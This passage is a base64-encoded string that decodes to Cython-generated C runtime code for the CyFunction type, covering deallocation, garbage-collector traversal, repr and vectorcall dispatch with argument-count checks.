Wx0cyk7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgdm9pZCBfX1B5eF9fQ3lGdW5jdGlvbl9kZWFsbG9jKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0pXG57XG4gICAgaWYgKF9fUHl4X0N5RnVuY3Rpb25fd2Vha3JlZmxpc3QobSkgIT0gTlVMTClcbiAgICAgICAgUHlPYmplY3RfQ2xlYXJXZWFrUmVmcygoUHlPYmplY3QgKikgbSk7XG4gICAgX19QeXhfQ3lGdW5jdGlvbl9jbGVhcihtKTtcbiAgICBfX1B5eF9QeUhlYXBUeXBlT2JqZWN0X0dDX0RlbChtKTtcbn1cbnN0YXRpYyB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fZGVhbGxvYyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptKVxue1xuICAgIFB5T2JqZWN0X0dDX1VuVHJhY2sobSk7XG4gICAgX19QeXhfX0N5RnVuY3Rpb25fZGVhbGxvYyhtKTtcbn1cbnN0YXRpYyBpbnQgX19QeXhfQ3lGdW5jdGlvbl90cmF2ZXJzZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZylcbntcbiAgICB7XG4gICAgICAgIGludCBlID0gX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKChQeU9iamVjdCopbSwgMSwgdmlzaXQsIGFyZyk7XG4gICAgICAgIGlmIChlKSByZXR1cm4gZTtcbiAgICB9XG4gICAgUHlfVklTSVQobS0+ZnVuY19jbG9zdXJlKTtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlfVklTSVQobS0+ZnVuYyk7XG4jZWxzZVxuICAgIFB5X1ZJU0lUKCgoUHlDRnVuY3Rpb25PYmplY3QqKW0pLT5tX21vZHVsZSk7XG4jZW5kaWZcbiAgICBQeV9WSVNJVChtLT5mdW5jX2RpY3QpO1xuICAgIF9fUHl4X1ZJU0lUX0NPTlNUKG0tPmZ1bmNfbmFtZSk7XG4gICAgX19QeXhfVklTSVRfQ09OU1QobS0+ZnVuY19xdWFsbmFtZSk7XG4gICAgUHlfVklTSVQobS0+ZnVuY19kb2MpO1xuICAgIFB5X1ZJU0lUKG0tPmZ1bmNfZ2xvYmFscyk7XG4gICAgX19QeXhfVklTSVRfQ09OU1QobS0+ZnVuY19jb2RlKTtcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5X1ZJU0lUKF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmoobSkpO1xuI2VuZGlmXG4gICAgUHlfVklTSVQobS0+ZGVmYXVsdHNfdHVwbGUpO1xuICAgIFB5X1ZJU0lUKG0tPmRlZmF1bHRzX2t3ZGljdCk7XG4gICAgUHlfVklTSVQobS0+ZnVuY19pc19jb3JvdXRpbmUpO1xuICAgIFB5X1ZJU0lUKG0tPmRlZmF1bHRzKTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeU9iamVjdCpcbl9fUHl4X0N5RnVuY3Rpb25fcmVwcihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcClcbntcbiAgICBQeU9iamVjdCAqcmVwcjtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICByZXByID0gUHlVbmljb2RlX0Zyb21Gb3JtYXQoIjxjeWZ1bmN0aW9uICVVIGF0ICVwPiIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wLT5mdW5jX3F1YWxuYW1lLCAodm9pZCAqKW9wKTtcbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiByZXByO1xufVxuc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9DYWxsTWV0aG9kKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKmFyZywgUHlPYmplY3QgKmt3KSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5T2JqZWN0ICpmID0gKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmdW5jKS0+ZnVuYztcbiAgICBQeUNGdW5jdGlvbiBtZXRoO1xuICAgIGludCBmbGFncztcbiAgICBtZXRoID0gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oZik7XG4gICAgaWYgKHVubGlrZWx5KCFtZXRoKSkgcmV0dXJuIE5VTEw7XG4gICAgZmxhZ3MgPSBQeUNGdW5jdGlvbl9HZXRGbGFncyhmKTtcbiAgICBpZiAodW5saWtlbHkoZmxhZ3MgPCAwKSkgcmV0dXJuIE5VTEw7XG4jZWxzZVxuICAgIFB5Q0Z1bmN0aW9uT2JqZWN0KiBmID0gKFB5Q0Z1bmN0aW9uT2JqZWN0KilmdW5jO1xuICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSBmLT5tX21sLT5tbF9tZXRoO1xuICAgIGludCBmbGFncyA9IGYtPm1fbWwtPm1sX2ZsYWdzO1xuI2VuZGlmXG4gICAgUHlfc3NpemVfdCBzaXplO1xuICAgIHN3aXRjaCAoZmxhZ3MgJiAoTUVUSF9WQVJBUkdTIHwgTUVUSF9LRVlXT1JEUyB8IE1FVEhfTk9BUkdTIHwgTUVUSF9PKSkge1xuICAgIGNhc2UgTUVUSF9WQVJBUkdTOlxuICAgICAgICBpZiAobGlrZWx5KGt3ID09IE5VTEwgfHwgUHlEaWN0X1NpemUoa3cpID09IDApKVxuICAgICAgICAgICAgcmV0dXJuICgqbWV0aCkoc2VsZiwgYXJnKTtcbiAgICAgICAgYnJlYWs7XG4gICAgY2FzZSBNRVRIX1ZBUkFSR1MgfCBNRVRIX0tFWVdPUkRTOlxuICAgICAgICByZXR1cm4gKCooUHlDRnVuY3Rpb25XaXRoS2V5d29yZHMpKHZvaWQoKikodm9pZCkpbWV0aCkoc2VsZiwgYXJnLCBrdyk7XG4gICAgY2FzZSBNRVRIX05PQVJHUzpcbiAgICAgICAgaWYgKGxpa2VseShrdyA9PSBOVUxMIHx8IFB5RGljdF9TaXplKGt3KSA9PSAwKSkge1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgICAgICAgICBzaXplID0gUHlUdXBsZV9HRVRfU0laRShhcmcpO1xuI2Vsc2VcbiAgICAgICAgICAgIHNpemUgPSBQeVR1cGxlX1NpemUoYXJnKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShzaXplIDwgMCkpIHJldHVybiBOVUxMO1xuI2VuZGlmXG4gICAgICAgICAgICBpZiAobGlrZWx5KHNpemUgPT0gMCkpXG4gICAgICAgICAgICAgICAgcmV0dXJuICgqbWV0aCkoc2VsZiwgTlVMTCk7XG4gICAgICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKFxuICAgICAgICAgICAgICAgIChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmdW5jLFxuICAgICAgICAgICAgICAgICJ0YWtlcyBubyBhcmd1bWVudHMiLCBzaXplKTtcbiAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICB9XG4gICAgICAgIGJyZWFrO1xuICAgIGNhc2UgTUVUSF9POlxuICAgICAgICBpZiAobGlrZWx5KGt3ID09IE5VTEwgfHwgUHlEaWN0X1NpemUoa3cpID09IDApKSB7XG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgICAgIHNpemUgPSBQeVR1cGxlX0dFVF9TSVpFKGFyZyk7XG4jZWxzZVxuICAgICAgICAgICAgc2l6ZSA9IFB5VHVwbGVfU2l6ZShhcmcpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KHNpemUgPCAwKSkgcmV0dXJuIE5VTEw7XG4jZW5kaWZcbiAgICAgICAgICAgIGlmIChsaWtlbHkoc2l6ZSA9PSAxKSkge1xuICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpyZXN1bHQsICphcmcwO1xuICAgICAgICAgICAgICAgICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICAgICAgICAgIGFyZzAgPSBQeVR1cGxlX0dFVF9JVEVNKGFyZywgMCk7XG4gICAgICAgICAgICAgICAgI2Vsc2VcbiAgICAgICAgICAgICAgICBhcmcwID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKGFyZywgMCk7IGlmICh1bmxpa2VseSghYXJnMCkpIHJldHVybiBOVUxMO1xuICAgICAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgICAgIHJlc3VsdCA9ICgqbWV0aCkoc2VsZiwgYXJnMCk7XG4gICAgICAgICAgICAgICAgI2lmICEoQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMpXG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKGFyZzApO1xuICAgICAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKFxuICAgICAgICAgICAgICAgIChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmdW5jLFxuICAgICAgICAgICAgICAgICJ0YWtlcyBleGFjdGx5IG9uZSBhcmd1bWVudCIsIHNpemUpO1xuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgIH1cbiAgICAgICAgYnJlYWs7XG4gICAgZGVmYXVsdDpcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1N5c3RlbUVycm9yLCAiQmFkIGNhbGwgZmxhZ3MgZm9yIEN5RnVuY3Rpb24iKTtcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfdHlwZV9lcnJvcihcbiAgICAgICAgKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWZ1bmMsICJ0YWtlcyBubyBrZXl3b3JkIGFyZ3VtZW50cyIpO1xuICAgIHJldHVybiBOVUxMO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fQ2FsbChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmFyZywgUHlPYmplY3QgKmt3KSB7XG4gICAgUHlPYmplY3QgKnNlbGYsICpyZXN1bHQ7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HZXRTZWxmKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopZnVuYyktPmZ1bmMpO1xuICAgIGlmICh1bmxpa2VseSghc2VsZikgJiYgUHlFcnJfT2NjdXJyZWQoKSkgcmV0dXJuIE5VTEw7XG4jZWxzZVxuICAgIHNlbGYgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KilmdW5jKS0+bV9zZWxmO1xuI2VuZGlmXG4gICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9DYWxsTWV0aG9kKGZ1bmMsIHNlbGYsIGFyZywga3cpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fQ2FsbEFzTWV0aG9kKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJncywgUHlPYmplY3QgKmt3KSB7XG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMgPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSBmdW5jO1xuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMICYmIChDWVRIT05fVkVDVE9SQ0FMTCB8fCBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTClcbiAgICAgX19weXhfdmVjdG9yY2FsbGZ1bmMgdmMgPSBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChjeWZ1bmMpO1xuICAgIGlmICh2Yykge1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgcmV0dXJuIF9fUHl4X1B5VmVjdG9yY2FsbF9GYXN0Q2FsbERpY3QoZnVuYywgdmMsICZQeVR1cGxlX0dFVF9JVEVNKGFyZ3MsIDApLCAoc2l6ZV90KVB5VHVwbGVfR0VUX1NJWkUoYXJncyksIGt3KTtcbiNlbHNlXG4gICAgICAgICh2b2lkKSAmX19QeXhfUHlWZWN0b3JjYWxsX0Zhc3RDYWxsRGljdDtcbiAgICAgICAgcmV0dXJuIFB5VmVjdG9yY2FsbF9DYWxsKGZ1bmMsIGFyZ3MsIGt3KTtcbiNlbmRpZlxuICAgIH1cbiNlbmRpZlxuICAgIGlmICgoY3lmdW5jLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fQ0NMQVNTKSAmJiAhKGN5ZnVuYy0+ZmxhZ3MgJiBfX1B5eF9DWUZVTkNUSU9OX1NUQVRJQ01FVEhPRCkpIHtcbiAgICAgICAgUHlfc3NpemVfdCBhcmdjO1xuICAgICAgICBQeU9iamVjdCAqbmV3X2FyZ3M7XG4gICAgICAgIFB5T2JqZWN0ICpzZWxmO1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgICAgIGFyZ2MgPSBQeVR1cGxlX0dFVF9TSVpFKGFyZ3MpO1xuI2Vsc2VcbiAgICAgICAgYXJnYyA9IFB5VHVwbGVfU2l6ZShhcmdzKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KGFyZ2MgPCAwKSkgcmV0dXJuIE5VTEw7XG4jZW5kaWZcbiAgICAgICAgbmV3X2FyZ3MgPSBQeVR1cGxlX0dldFNsaWNlKGFyZ3MsIDEsIGFyZ2MpO1xuICAgICAgICBpZiAodW5saWtlbHkoIW5ld19hcmdzKSlcbiAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICBzZWxmID0gUHlUdXBsZV9HZXRJdGVtKGFyZ3MsIDApO1xuICAgICAgICBpZiAodW5saWtlbHkoIXNlbGYpKSB7XG4gICAgICAgICAgICBQeV9ERUNSRUYobmV3X2FyZ3MpO1xuICAgICAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICAgICAgICAgICAgICAidW5ib3VuZCBtZXRob2QgJS4yMDBTKCkgbmVlZHMgYW4gYXJndW1lbnQiLFxuICAgICAgICAgICAgICAgICAgICAgICAgIGN5ZnVuYy0+ZnVuY19xdWFsbmFtZSk7XG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgfVxuICAgICAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX0NhbGxNZXRob2QoZnVuYywgc2VsZiwgbmV3X2FyZ3MsIGt3KTtcbiAgICAgICAgUHlfREVDUkVGKG5ld19hcmdzKTtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX0NhbGwoZnVuYywgYXJncywga3cpO1xuICAgIH1cbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMICYmIChDWVRIT05fVkVDVE9SQ0FMTCB8fCBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTClcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfQ2hlY2tBcmdzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmN5ZnVuYywgUHlfc3NpemVfdCBuYXJncywgUHlPYmplY3QgKmt3bmFtZXMpXG57XG4gICAgaW50IHJldCA9IDA7XG4gICAgaWYgKChjeWZ1bmMtPmZsYWdzICYgX19QeXhfQ1lGVU5DVElPTl9DQ0xBU1MpICYmICEoY3lmdW5jLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fU1RBVElDTUVUSE9EKSkge1xuICAgICAgICBpZiAodW5saWtlbHkobmFyZ3MgPCAxKSkge1xuICAgICAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9yYWlzZV90eXBlX2Vycm9yKFxuICAgICAgICAgICAgICAgIGN5ZnVuYywgIm5lZWRzIGFuIGFyZ3VtZW50Iik7XG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgIH1cbiAgICAgICAgcmV0ID0gMTtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KGt3bmFtZXMpICYmIHVubGlrZWx5KF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUoa3duYW1lcykpKSB7XG4gICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfdHlwZV9lcnJvcihcbiAgICAgICAgICAgIGN5ZnVuYywgInRha2VzIG5vIGtleXdvcmQgYXJndW1lbnRzIik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgcmV0dXJuIHJldDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9OT0FSR1MoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpXG57XG4gICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqY3lmdW5jID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKilmdW5jO1xuI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMXG4gICAgUHlfc3NpemVfdCBuYXJncyA9IChQeV9zc2l6ZV90KW5hcmdzZjtcbiNlbHNlXG4gICAgUHlfc3NpemVfdCBuYXJncyA9IFB5VmVjdG9yY2FsbF9OQVJHUyhuYXJnc2YpO1xuI2VuZGlmXG4gICAgUHlPYmplY3QgKnNlbGY7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSBQeUNGdW5jdGlvbl9HZXRGdW5jdGlvbihjeWZ1bmMtPmZ1bmMpO1xuICAgIGlmICh1bmxpa2VseSghbWV0aCkpIHJldHVybiBOVUxMO1xuI2Vsc2VcbiAgICBQeUNGdW5jdGlvbiBtZXRoID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9tbC0+bWxfbWV0aDtcbiNlbmRpZlxuICAgIHN3aXRjaCAoX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0NoZWNrQXJncyhjeWZ1bmMsIG5hcmdzLCBrd25hbWVzKSkge1xuICAgIGNhc2UgMTpcbiAgICAgICAgc2VsZiA9IGFyZ3NbMF07XG4gICAgICAgIGFyZ3MgKz0gMTtcbiAgICAgICAgbmFyZ3MgLT0gMTtcbiAgICAgICAgYnJlYWs7XG4gICAgY2FzZSAwOlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgc2VsZiA9IFB5Q0Z1bmN0aW9uX0dldFNlbGYoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5mdW5jKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmKSAmJiBQeUVycl9PY2N1cnJlZCgpKSByZXR1cm4gTlVMTDtcbiNlbHNlXG4gICAgICAgIHNlbGYgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX3NlbGY7XG4jZW5kaWZcbiAgICAgICAgYnJlYWs7XG4gICAgZGVmYXVsdDpcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIGlmICh1bmxpa2VseShuYXJncyAhPSAwKSkge1xuICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKFxuICAgICAgICAgICAgY3lmdW5jLCAidGFrZXMgbm8gYXJndW1lbnRzIiwgbmFyZ3MpO1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgcmV0dXJuIG1ldGgoc2VsZiwgTlVMTCk7XG59XG5zdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfTyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcylcbntcbiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMgPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKWZ1bmM7XG4jaWYgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTExcbiAgICBQeV9zc2l6ZV90IG5hcmdzID0gKFB5X3NzaXplX3QpbmFyZ3NmO1xuI2Vsc2VcbiAgICBQeV9zc2l6ZV90IG5hcmdzID0gUHlWZWN0b3JjYWxsX05BUkdTKG5hcmdzZik7XG4jZW5kaWZcbiAgICBQeU9iamVjdCAqc2VsZjtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlDRnVuY3Rpb24gbWV0aCA9IFB5Q0Z1bmN0aW9uX0dldEZ1bmN0aW9uKGN5ZnVuYy0+ZnVuYyk7XG4gICAgaWYgKHVubGlrZWx5KCFtZXRoKSkgcmV0dXJuIE5VTEw7XG4jZWxzZVxuICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX21sLT5tbF9tZXRoO1xuI2VuZGlmXG4gICAgc3dpdGNoIChfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfQ2hlY2tBcmdzKGN5ZnVuYywgbmFyZ3MsIGt3bmFtZXMpKSB7XG4gICAgY2FzZSAxOlxuICAgICAgICBzZWxmID0gYXJnc1swXTtcbiAgICAgICAgYXJncyArPSAxO1xuICAgICAgICBuYXJncyAtPSAxO1xuICAgICAgICBicmVhaztcbiAgICBjYXNlIDA6XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgICAgICBzZWxmID0gUHlDRnVuY3Rpb25fR2V0U2VsZigoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPmZ1bmMpO1xuICAgICAgICBpZiAodW5saWtlbHkoIXNlbGYpICYmIFB5RXJyX09jY3VycmVkKCkpIHJldHVybiBOVUxMO1xuI2Vsc2VcbiAgICAgICAgc2VsZiA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fc2VsZjtcbiNlbmRpZlxuICAgICAgICBicmVhaztcbiAgICBkZWZhdWx0OlxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KG5hcmdzICE9IDEpKSB7XG4gICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfYXJndW1lbnRfY291bnRfZXJyb3IoXG4gICAgICAgICAgICBjeWZ1bmMsICJ0YWtlcyBleGFjdGx5IG9uZSBhcmd1bWVudCIsIG5hcmdzKTtcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIHJldHVybiBtZXRoKHNlbGYsIGFyZ3NbMF0pO1xufVxuc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKVxue1xuICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmN5ZnVuYyA9IChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopZnVuYztcbiNpZiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTFxuICAgIFB5X3NzaXplX3QgbmFyZ3MgPSAoUHlfc3NpemVfdCluYXJnc2Y7XG4jZWxzZVxuICAgIFB5X3NzaXplX3QgbmFyZ3MgPSBQeVZlY3RvcmNhbGxfTkFSR1MobmFyZ3NmKTtcbiNlbmRpZlxuICAgIFB5T2JqZWN0ICpzZWxmO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeUNGdW5jdGlvbiBtZXRoID0gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oY3lmdW5jLT5mdW5jKTtcbiAgICBpZiAodW5saWtlbHkoIW1ldGgpKSByZXR1cm4gTlVMTDtcbiNlbHNlXG4gICAgUHlDRnVuY3Rpb24gbWV0aCA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fbWwtPm1sX21ldGg7XG4jZW5kaWZcbiAgICBzd2l0Y2ggKF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9DaGVja0FyZ3MoY3lmdW5jLCBuYXJncywgTlVMTCkpIHtcbiAgICBjYXNlIDE6XG4gICAgICAgIHNlbGYgPSBhcmdzWzBdO1xuICAgICAgICBhcmdzICs9IDE7XG4gICAgICAgIG5hcmdzIC09IDE7XG4gICAgICAgIGJyZWFrO1xuICAgIGNhc2UgMDpcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HZXRTZWxmKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+ZnVuYyk7XG4gICAgICAgIGlmICh1bmxpa2VseSghc2VsZikgJiYgUHlFcnJfT2NjdXJyZWQoKSkgcmV0dXJuIE5VTEw7XG4jZWxzZVxuICAgICAgICBzZWxmID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9zZWxmO1xuI2VuZGlmXG4gICAgICAgIGJyZWFrO1xuICAgIGRlZmF1bHQ6XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICByZXR1cm4gKChfX1B5eF9QeUNGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHMpKHZvaWQoKikodm9pZCkpbWV0aCkoc2VsZiwgYXJncywgbmFyZ3MsIGt3bmFtZXMpO1xufVxuc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTX01FVEhPRChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcylcbntcbiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMgPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKWZ1bmM7XG4gICAgUHlUeXBlT2JqZWN0ICpjbHMgPSAoUHlUeXBlT2JqZWN0ICopIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmooY3lmdW5jKTtcbiNpZiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTFxuICAgIFB5X3NzaXplX3QgbmFyZ3MgPSAoUHlfc3NpemVfdCluYXJnc2Y7XG4jZWxzZVxuICAgIFB5X3NzaXplX3QgbmFyZ3MgPSBQeVZlY3RvcmNhbGxfTkFSR1MobmFyZ3NmKTtcbiNlbmRpZlxuICAgIFB5T2JqZWN0ICpzZWxmO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeUNGdW5jdGlvbiBtZXRoID0gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oY3lmdW5jLT5mdW5jKTtcbiAgICBpZiAodW5saWtlbHkoIW1ldGgpKSByZXR1cm4gTlVMTDtcbiNlbHNlXG4gICAgUHlDRnVuY3Rpb24gbWV0aCA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fbWwtPm1sX21ldGg7XG4jZW5kaWZcbiAgICBzd2l0Y2ggKF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9DaGVja0FyZ3MoY3lmdW5jLCBuYXJncywgTlVMTCkpIHtcbiAgICBjYXNlIDE6XG4gICAgICAgIHNlbGYgPSBhcmdzWzBdO1xuICAgICAgICBhcmdzICs9IDE7XG4gICAgICAgIG5hcmdzIC09IDE7XG4gICAgICAgIGJyZWFrO1xuICAgIGNhc2UgMDpcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HZXRTZWxmKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+ZnVuYyk7XG4gICAgICAgIGlmICh1bmxpa2VseSghc2VsZikgJiYgUHlFcnJfT2NjdXJyZWQoK